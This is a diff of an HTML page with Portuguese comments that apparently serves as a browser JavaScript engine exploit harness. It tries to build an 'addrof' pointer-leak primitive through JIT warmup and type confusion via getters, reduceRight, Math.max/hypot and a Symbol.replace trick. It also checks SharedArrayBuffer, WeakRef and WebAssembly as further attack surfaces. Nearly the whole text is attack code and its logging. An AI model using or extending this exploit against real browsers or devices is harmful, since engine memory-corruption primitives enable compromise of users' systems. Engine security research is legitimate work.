-    var f = new Float64Array(makeAttackIterable(phase));
-    warmCount++;
-  }
-  info('Warmup: ' + warmCount + ' Float64Arrays criados.');
-  sep();
-
-  // Fase ataque: posição 3 é attackObj (cujo valueOf retorna victim object)
-  phase[0] = 'attack';
-  conversionLog = [];
-  info('Fase ataque: posição 3 = objeto cujo valueOf retorna victim...');
-
-  try {
-    var attackF64 = new Float64Array(makeAttackIterable(phase));
-    info('Float64Array criado. length=' + attackF64.length);
-    info('conversionLog: [' + conversionLog.slice(0,10).join(', ') + ']');
-    info('attackF64[3] = ' + attackF64[3] + ' bits=' + f64bits(attackF64[3]));
-
-    if(attackF64[3] === 0 || isNaN(attackF64[3])) {
-      info('attackF64[3]=0 ou NaN — ToNumber(victim) = NaN → 0 no Float64Array (normal)');
-    } else if(isInterestingBits(attackF64[3])) {
-      alerta('ADDROF via Float64Array constructor!\n' +
-             'attackF64[3] = ' + attackF64[3] + ' bits=' + f64bits(attackF64[3]));
-    }
-  } catch(e) {
-    alerta('EXCECAO no construtor Float64Array: ' + e.message);
-  }
-
-  sep();
-  // Variante MAIS PROMISSORA: Array.from() com mapFn que recebe objeto
-  info('\nVariante PRINCIPAL: Array.from(doubleArr, mapFn) com getter que muda tipo...');
-  info('Array.from chama mapFn(element, index). Se element muda de double para objeto');
-  info('entre a leitura do element e a chamada do mapFn, o JIT pode ter types errados.\n');
-
-  var victim2 = { magic: 0xBEEFBEEF, ptr: new Uint32Array(4) };
-  var arr_from = [1.1, 2.2, 3.3, 4.4, 5.5];
-  var triggered_from = false;
-
-  // Getter no índice 2 que muda arr_from[3] para objeto
-  Object.defineProperty(arr_from, 2, {
-    get: function() {
-      if(!triggered_from) {
-        triggered_from = true;
-        arr_from[3] = victim2;
+      if(!triggered2) {
+        triggered2 = true;
+        attackArr2[2] = victim; // [2] será lido depois (reduceRight vai [4],[3],[2],[1],[0])
         forceGC();
-        info('Getter[2] em Array.from: arr_from[3] = victim2');
+        info('Getter[3] em reduceRight: attackArr2[2] = victim');
       }
-      return 3.3;
+      return 2.0;
     },
     configurable: true, enumerable: true
   });
 
-  // mapFn que apenas retorna o elemento — JIT especializa para double→double
-  var cleanArr = [10.0, 20.0, 30.0, 40.0, 50.0];
-  function identity(v) { return v; }
-
-  info('Aquecendo Array.from(cleanArr, identity) (50k calls)...');
-  for(var w2=0;w2<50000;w2++) Array.from(cleanArr, identity);
-  info('Warmup completo.');
-
-  // Ataque: usar arr_from (com getter que injeta objeto)
-  var fromResult = Array.from(arr_from, identity);
-  info('Array.from(arr_from, identity):');
-  for(var i=0;i<fromResult.length;i++) {
-    var v = fromResult[i];
-    info('  ['+i+']: ' + v + ' typeof=' + typeof v);
-    if(i===3) {
-      if(typeof v === 'number') {
-        info('  bits: ' + f64bits(v));
-        if(isInterestingBits(v)) {
-          alerta('ADDROF via Array.from mapFn!\n' +
-                 'fromResult[3] = ' + v + ' bits=' + f64bits(v) + '\n' +
-                 'mapFn recebeu victim2 mas retornou double com bits suspeitos!');
-        }
-      } else if(typeof v === 'object') {
-        info('  ===victim2: ' + (v===victim2));
-        ok('Array.from preservou o objeto corretamente.');
-      }
-    }
+  function sumReduceRight(a) {
+    return a.reduceRight(function(acc, cur) { return acc + cur; }, 0.0);
   }
-
-  // ÚLTIMO RECURSO: Array.prototype.map com TypedArray destino
-  sep();
-  info('\nÚltimo recurso: Float64Array.from(jsArray) onde jsArray[3] é objeto...');
-  var jsArr = [1.1, 2.2, 3.3, null, 5.5]; // [3] será objeto
-  jsArr[3] = victim2; // colocar objeto diretamente
-  info('jsArr[3] = victim2 (typeof=object)');
+  for(var w2=0;w2<50000;w2++) sumReduceRight([5.0,4.0,3.0,2.0,1.0]);
+  info('Warmup reduceRight completo.');
 
   try {
-    var tf64 = Float64Array.from(jsArr);
-    info('Float64Array.from(jsArr)[3] = ' + tf64[3] + ' bits=' + f64bits(tf64[3]));
-    if(isInterestingBits(tf64[3])) {
-      alerta('ADDROF via Float64Array.from!\n' +
-             'tf64[3] = ' + tf64[3] + ' bits=' + f64bits(tf64[3]));
-    } else {
-      info('Valor: ' + tf64[3] + ' (ToNumber(victim2)=NaN→' + tf64[3] + ')');
+    var r2 = sumReduceRight(attackArr2);
+    info('sumReduceRight(attackArr2) = ' + r2 + ' bits=' + f64bits(r2));
+    if(looksLikePtr(r2)) alerta('ADDROF via reduceRight: ' + f64bits(r2));
+    else if(isNaN(r2)) info('NaN — ToNumber(victim)=NaN propagado pelo reduce');
+  } catch(e) { alerta('EXCECAO reduceRight: ' + e.message); }
+
+  sep();
+  // Variante ESPECIAL: Math.hypot/Math.max com objeto
+  info('\nVariante: Math.max.apply(null, arrayWithVictim)...');
+  var arrWithVictim = [1.0, 2.0, victim, 4.0, 5.0];
+  try {
+    var maxResult = Math.max.apply(null, arrWithVictim);
+    info('Math.max.apply(null, [1,2,victim,4,5]) = ' + maxResult + ' bits=' + f64bits(maxResult));
+    if(looksLikePtr(maxResult)) alerta('ADDROF via Math.max: ' + f64bits(maxResult));
+  } catch(e) { alerta('EXCECAO Math.max: ' + e.message); }
+
+  // Math.hypot — converte cada argumento para float
+  try {
+    var hypotResult = Math.hypot(1.0, victim, 3.0);
+    info('Math.hypot(1.0, victim, 3.0) = ' + hypotResult + ' bits=' + f64bits(hypotResult));
+    if(looksLikePtr(hypotResult)) alerta('ADDROF via Math.hypot: ' + f64bits(hypotResult));
+  } catch(e) { alerta('EXCECAO Math.hypot: ' + e.message); }
+}
+
+// ─── 47-D ─────────────────────────────────────────────────────────────────
+function runD() {
+  log.textContent = '[TEST 47-D] Comparação direta e valueOf — extrair bits do JSValue\n';
+  sep();
+  info('Técnica final: usar operações que RETORNAM informação sobre o JSValue');
+  info('sem precisar que o motor o trate como double diretamente.\n');
+
+  info('Sub-técnicas:');
+  info('  D1: Object.is(a, b) com double que talvez seja o endereço');
+  info('  D2: valueOf em loop tight — forçar inline do valueOf no JIT');
+  info('  D3: Comparação bitwise do ponteiro via Int32Array compartilhado\n');
+
+  var victim = { magic: 0xFACEFACE, arr: new Uint32Array(4) };
+
+  sep();
+  // D1: Scan binário do espaço de endereços via SCA timing
+  // (não é addrof direto mas revela faixa de endereços)
+  info('D1: Scan de endereços via Object.is timing (especulativo)...');
+  info('(Este teste verifica se o motor compara endereços em Object.is)');
+
+  // Em JSC, Object.is(a, b) para dois objetos compara identidade (ptr equality)
+  // Mas se forçarmos o JIT a comparar um double com um objeto...
+  var phase = ['warmup'];
+  var evilPattern = { [Symbol.replace]: function(s) {
+    if(phase[0]==='warmup') return s;
+    return { toString:function(){return s;}, valueOf:function(){return s;}, length: victim };
+  }};
+  function getLen(s) { return s.replace(evilPattern,'').length; }
+  for(var w=0;w<50000;w++) getLen('test string');
+  info('Warmup getLen completo (primitivo confirmado 40-C).');
+
+  phase[0] = 'attack';
+  var confusedLen = getLen('test string');
+  info('confusedLen = ' + confusedLen + ' typeof=' + typeof confusedLen);
+
+  if(typeof confusedLen === 'object') {
+    // Temos o victim object. Agora: tentar extrair bits via operações numéricas
+    info('\nExtração de bits via operações em confusedLen (=victim)...');
+
+    // D2: forced valueOf inline
+    info('\nD2: Forçar valueOf inline no JIT...');
+    var valueOfCalls = 0;
+    var victimWithValueOf = {
+      magic: 0xDEADBEEF,
+      // valueOf que retorna valores controlados para que possamos
+      // fazer engenharia reversa do que o JIT faz com o objeto
+      valueOf: function() {
+        valueOfCalls++;
+        // Retornar valor único que não é um double normal
+        // Baseado nos testes anteriores o JIT chama valueOf normalmente
+        return 0xDEADBEEF; // 3735928559
+      }
+    };
+
+    phase[0] = 'attack';
+    var evilPattern2 = { [Symbol.replace]: function(s) {
+      if(phase[0]==='warmup') return s;
+      return { toString:function(){return s;}, valueOf:function(){return s;},
+               length: victimWithValueOf };
+    }};
+    function getLen2(s) { return s.replace(evilPattern2,'').length; }
+    phase[0] = 'warmup';
+    for(var w2=0;w2<50000;w2++) getLen2('probe');
+    phase[0] = 'attack';
+    valueOfCalls = 0;
+
+    var r2 = getLen2('probe');
+    info('getLen2 com victimWithValueOf: ' + r2 + ' typeof=' + typeof r2);
+    info('valueOfCalls: ' + valueOfCalls);
+
+    if(typeof r2 === 'number') {
+      info('bits: ' + f64bits(r2));
+      if(looksLikePtr(r2)) {
+        alerta('BITS DE PONTEIRO via valueOf!\nbits=' + f64bits(r2));
+      } else if(r2 === 0xDEADBEEF || r2 === 3735928559) {
+        info('Retornou o valor do valueOf() = 0xDEADBEEF (' + r2 + ')');
+        info('O JIT chamou valueOf() e retornou o número — não há leak de ponteiro aqui.');
+      }
+    } else if(typeof r2 === 'object' && r2 === victimWithValueOf) {
+      info('Retornou victimWithValueOf diretamente (sem chamar valueOf).');
+      info('valueOfCalls=' + valueOfCalls + ' — confirmado: objeto passado sem valueOf');
     }
-  } catch(e) { info('Float64Array.from lançou: ' + e.message); }
+
+    sep();
+    // D3: SharedArrayBuffer + Atomics para detectar o endereço via racing
+    info('\nD3: Verificando suporte a SharedArrayBuffer...');
+    if(typeof SharedArrayBuffer !== 'undefined') {
+      info('SharedArrayBuffer disponível! Tentando Atomics timing...');
+      try {
+        var sab = new SharedArrayBuffer(64);
+        var sabView = new Int32Array(sab);
+        sabView[0] = 0;
+        info('SAB criado. Atomics.load: ' + Atomics.load(sabView, 0));
+        alerta('SharedArrayBuffer DISPONÍVEL!\n' +
+               'Atomics podem ser usados para timing attacks e construção de primitivos sync.\n' +
+               'Isso abre uma nova superfície de ataque não explorada!');
+      } catch(e) {
+        info('SAB criou mas Atomics falhou: ' + e.message);
+      }
+    } else {
+      info('SharedArrayBuffer não disponível neste contexto.');
+    }
+
+    // D4: WeakRef — o motor armazena referência fraca; GC revela se objeto está vivo
+    info('\nD4: WeakRef disponível?');
+    if(typeof WeakRef !== 'undefined') {
+      var wr = new WeakRef(victim);
+      info('WeakRef(victim) criado.');
+      var deref = wr.deref();
+      info('wr.deref() === victim: ' + (deref === victim));
+      forceGC();
+      var deref2 = wr.deref();
+      info('wr.deref() após GC: ' + (deref2 ? 'objeto ainda vivo' : 'undefined (coletado)'));
+      if(deref2) {
+        info('victim.magic após GC: 0x' + deref2.magic.toString(16));
+      }
+    } else {
+      info('WeakRef não disponível.');
+    }
+  } else {
+    info('confusedLen não é objeto neste contexto.');
+  }
+
+  sep();
+  // Último teste: verificar se wasm está disponível (abre MUITAS novas superfícies)
+  info('\nVerificando disponibilidade de WebAssembly...');
+  if(typeof WebAssembly !== 'undefined') {
+    alerta('WEBASSEMBLY DISPONÍVEL!\n' +
+           'Wasm abre novos vetores de ataque:\n' +
+           '  - wasm memory.grow() para overlap com JS heap\n' +
+           '  - wasm table.get() type confusion\n' +
+           '  - wasm↔JS boundary type confusion\n' +
+           '  - wasm linear memory como primitive read/write buffer\n' +
+           'Recomendar: criar TEST 48 focado em WebAssembly!');
+
+    // Verificar se podemos compilar wasm básico
+    try {
+      // Wasm mínimo: módulo com função que retorna 42
+      var wasmBytes = new Uint8Array([
+        0x00,0x61,0x73,0x6d, // magic: \0asm
+        0x01,0x00,0x00,0x00, // version: 1
+        0x01,0x05,0x01,0x60,0x00,0x01,0x7f, // type section: () -> i32
+        0x03,0x02,0x01,0x00, // function section
+        0x07,0x07,0x01,0x03,0x67,0x65,0x74,0x00,0x00, // export "get"
+        0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b // code: i32.const 42; end
+      ]);
+      WebAssembly.compile(wasmBytes).then(function(mod) {
+        return WebAssembly.instantiate(mod);
+      }).then(function(inst) {
+        var val = inst.exports.get();
+        alerta('WASM COMPILADO E EXECUTADO!\ninst.exports.get() = ' + val + '\n' +
+               'WebAssembly funcional — exploits via wasm são viáveis!');
+      }).catch(function(e) {
+        info('wasm compile/instantiate falhou: ' + e.message);
+      });
+    } catch(e) {
+      info('WebAssembly.compile() síncrono falhou: ' + e.message);
+    }
+  } else {
+    info('WebAssembly não disponível.');
+    info('Próxima opção: testar worker threads e MessageChannel para primitivos de timing.');
+  }
 }
 </script>
 </body>
